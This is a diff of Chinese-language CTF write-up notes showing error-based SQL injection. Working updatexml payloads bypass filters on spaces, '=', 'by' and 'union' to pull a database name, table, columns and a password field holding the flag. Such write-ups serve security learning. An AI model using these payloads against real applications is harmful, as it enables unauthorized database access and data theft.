@@ -365,7 +365,7 @@ echo serialize($a);
 用单引号搭配其他sql语句进行测试，发现空格，=，by，union被屏蔽掉了
 空格被屏蔽使用()来构造语句(一定要注意括号范围以及关系)
 等号被屏蔽使用like替代
-by,union被屏蔽则使用报错注入（updatexml,extractvalue等，使用方法一致）。
+by,union被屏蔽则使用===报错注入===（updatexml,extractvalue等，使用方法一致）。
 先获取数据库名：
 `1'or(updatexml(1,concat(0x7e,database()),1))#`
 再获取表名：
@@ -374,10 +374,11 @@ by,union被屏蔽则使用报错注入（updatexml,extractvalue等，使用方�
 `1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1'))),1))#
 再获取其值(直接select回显不完整且屏蔽了substr函数，使用left与right函数拼接flag)：
 左边的部分：
-1'or(updatexml(1,concat(0x7e,(select(left(password,30))from(geek.H4rDsq1))),1))#
+`1'or(updatexml(1,concat(0x7e,(select(left(password,30))from(geek.H4rDsq1))),1))#`
 右边的部分
-1'or(updatexml(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1))),1))#
-左：flag{05c6eef2-494f-4b0b-8f6e-6
-右：2-494f-4b0b-8f6e-6a278c2fc7cf}
-完整：flag{05c6eef2-494f-4b0b-8f6e-6a278c2fc7cf}
+`1'or(updatexml(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1))),1))#`
+左：`flag{05c6eef2-494f-4b0b-8f6e-6`
+右：`2-494f-4b0b-8f6e-6a278c2fc7cf}`
+完整：`flag{05c6eef2-494f-4b0b-8f6e-6a278c2fc7cf}`
+ps:[[内置函数与特殊数据库.pdf]]
 
